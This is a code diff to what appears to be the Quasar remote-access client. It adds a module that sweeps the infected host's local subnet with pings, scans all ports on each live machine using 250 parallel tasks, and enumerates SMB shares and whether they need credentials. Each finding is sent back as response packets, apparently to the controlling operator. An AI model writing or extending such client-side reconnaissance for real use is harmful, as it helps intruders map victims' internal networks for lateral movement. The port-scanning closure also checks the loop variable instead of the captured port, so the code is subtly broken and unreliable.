@@ -9,9 +9,9 @@ using System.Net.NetworkInformation;
 using System.Net.Sockets;
 using System;
 using System.Threading.Tasks;
-using System.Windows.Forms;
 using Quasar.Client.Networking;
 using System.Threading;
+using System.Security.Principal;
 
 namespace Quasar.Client.Helper.Network
 {
@@ -64,7 +64,7 @@ namespace Quasar.Client.Helper.Network
             return totalPotentialIPs;
         }
 
-        public static void ScanInterfaceAction(InterfaceEntity entity, Action<AddressEntity, InterfaceEntity> action, Action<int, int, int, int> progress)
+        public static void ScanInterfaceAction(InterfaceEntity entity, Action<DoNetworkScanResponse> action, Action<DoNetworkScanProgress> progress)
         {
             NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
             string normalizedMac = entity.MAC.Replace(":", "").Replace("-", "").ToUpper();
@@ -80,6 +80,9 @@ namespace Quasar.Client.Helper.Network
 
             var ipProps = targetInterface.GetIPProperties();
             var unicastAddresses = ipProps.UnicastAddresses.Where(ua => ua.Address.AddressFamily == AddressFamily.InterNetwork);
+
+            // Thread limiter for port scanning
+            SemaphoreSlim portSemaphore = new SemaphoreSlim(250);
 
             foreach (var unicast in unicastAddresses)
             {
@@ -112,114 +115,96 @@ namespace Quasar.Client.Helper.Network
                 Parallel.ForEach(ipList, ipScanOptions, currentIp =>
                 {
                     Interlocked.Decrement(ref remainingIps);
-                    try
-                    {
-                        // targetInterfaceIndex must be 1-indexed for math reasons
-                        progress(totalInterfaces, targetInterfaceIndex + 1, totalIps, remainingIps);
-                        using (Ping ping = new Ping())
-                        {
-                            try
-                            {
-                                PingReply reply = ping.Send(currentIp, 1000);
-                                if (reply.Status != IPStatus.Success)
-                                {
-                                    return;
-                                }
-                            }
-                            catch
-                            {
-                                return;
-                            }
-                        }
-                        AddressEntity networkEntity = new AddressEntity { InterfaceIndex = targetInterfaceIndex, Address = currentIp, Ports = new int[] { }, Shares = new string[] { } };
-                        action(networkEntity, entity);
-                        List<int> ports = new List<int>();
-                        for (int port = 1; port < 65535; port++)
-                        {
-                            if (IsPortOpen(currentIp, port, 100))
-                            {
-                                ports.Add(port);
-                            }
-                            if (port % 1000 == 0)
-                            {
-                                MessageBox.Show($"Completed {port} Ports!", $"{currentIp}");
-                            }
-                        }
-                        MessageBox.Show("Finished port scan!", $"{currentIp}");
-                        networkEntity.Ports = ports.ToArray();
-                        //Share detection?
-                        action(networkEntity, entity);
-                    }
-                    catch (Exception ex)
-                    {
-                        MessageBox.Show(ex.ToString());
-                        // Generic Failure
-                    }
-                });
-            }
-        }
-
-        public static List<AddressEntity> ScanInterface(InterfaceEntity entity)
-        {
-            List<AddressEntity> detectedEntities = new List<AddressEntity>();
-            string normalizedMac = entity.MAC.Replace(":", "").Replace("-", "").ToUpper();
-            NetworkInterface targetInterface = NetworkInterface.GetAllNetworkInterfaces()
-                .FirstOrDefault(nic => nic.GetPhysicalAddress().ToString().ToUpper() == normalizedMac);
-            int targetInterfaceIndex = Array.IndexOf(NetworkInterface.GetAllNetworkInterfaces(), targetInterface);
-
-            if (targetInterface == null)
-                return detectedEntities; // Interface Not Found
-
-            var ipProps = targetInterface.GetIPProperties();
-            var unicastAddresses = ipProps.UnicastAddresses.Where(ua => ua.Address.AddressFamily == AddressFamily.InterNetwork);
-
-            foreach (var unicast in unicastAddresses)
-            {
-                IPAddress ipAddress = unicast.Address;
-                IPAddress subnetMask = unicast.IPv4Mask;
-
-                if (subnetMask == null)
-                    return detectedEntities; // Subnet Not Found
-
-                IPAddress networkAddress = GetNetworkAddress(ipAddress, subnetMask);
-                IPAddress broadcastAddress = GetBroadcastAddress(ipAddress, subnetMask);
-
-                uint start = IpToUint(networkAddress) + 1;
-                uint end = IpToUint(broadcastAddress) + 1;
-
-                for (uint current = start; current <= end; current++)
-                {
-                    IPAddress currentIp = UintToIp(current);
+                    // targetInterfaceIndex must be 1-indexed for math reasons
+                    DoNetworkScanProgress report = new DoNetworkScanProgress { NetworkInterfaces = totalInterfaces, InterfaceIndex = targetInterfaceIndex, Addresses = totalIps, CurrentAddress = remainingIps };
+                    progress(report);
                     using (Ping ping = new Ping())
                     {
                         try
                         {
-                            PingReply reply = ping.Send(currentIp, 100);
+                            PingReply reply = ping.Send(currentIp, 1000);
                             if (reply.Status != IPStatus.Success)
                             {
-                                continue;
+                                return;
                             }
                         }
                         catch
                         {
-                            continue;
+                            return;
                         }
                     }
-                    AddressEntity networkEntity = new AddressEntity { InterfaceIndex = targetInterfaceIndex, Address = currentIp, Ports = new int[] { }, Shares = new string[] { } };
+                    AddressEntity networkEntity = new AddressEntity { InterfaceIndex = targetInterfaceIndex, Address = currentIp.ToString(), Ports = new int[] { }, Shares = new ShareEntity[] { } };
+                    DoNetworkScanResponse packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
+                    action(packet);
                     List<int> ports = new List<int>();
+                    List<Task> portTasks = new List<Task>();
                     for (int port = 1; port < 65535; port++)
                     {
-                        if (IsPortOpen(currentIp, port, 100))
+                        int currentPort = port;
+                        portTasks.Add(Task.Run(async () =>
                         {
-                            ports.Add(port);
-                        }
+                            await portSemaphore.WaitAsync();
+                            try
+                            {
+                                progress(new DoNetworkScanProgress
+                                {
+                                    NetworkInterfaces = totalInterfaces,
+                                    InterfaceIndex = targetInterfaceIndex,
+                                    Addresses = totalIps,
+                                    CurrentAddress = remainingIps,
+                                    ScanningPorts = true,
+                                    ScanningShares = false,
+                                    CurrentPort = currentPort,
+                                    NIC = entity,
+                                    Address = networkEntity
+                                });
+                                if (IsPortOpen(currentIp, port, 100))
+                                {
+                                    lock (ports)
+                                    {
+                                        ports.Add(port);
+                                    }
+                                    lock (networkEntity) 
+                                    {
+                                        networkEntity.Ports = ports.ToArray();
+                                    }
+                                    action(new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity });
+                                }
+                            }
+                            finally
+                            {
+                                portSemaphore.Release();
+                            }
+                        }));
                     }
+                    Task.WaitAll(portTasks.ToArray());
                     networkEntity.Ports = ports.ToArray();
-                    //Share detection?
-                    detectedEntities.Add(networkEntity);
-                }
+                    packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
+                    action(packet);
+                    report.ScanningPorts = false;
+                    report.ScanningShares = true;
+                    progress(report);
+                    List<ShareEntity> shares = new List<ShareEntity>();
+                    SMBHelper.GetSMBSharesWithCredentialInfo(currentIp.ToString(), (share) =>
+                    {
+                        ShareEntity shareEntity = new ShareEntity
+                        {
+                            ShareName = share.ShareName,
+                            ShareType = share.ShareType,
+                            Remark = share.Remark,
+                            RequiresCredentials = share.RequiresCredentials
+                        };
+                        shares.Add(shareEntity);
+                        networkEntity.Shares = shares.ToArray();
+                        packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
+                        action(packet);
+                    });
+                    networkEntity.Shares = shares.ToArray();
+                    packet = new DoNetworkScanResponse { Result = true, FailureReason = "", Address = networkEntity, Interface = entity };
+                    action(packet);
+                    report.ScanningShares = false;
+                });
             }
-            return detectedEntities;
         }
 
         private static uint IpToUint(IPAddress ip)
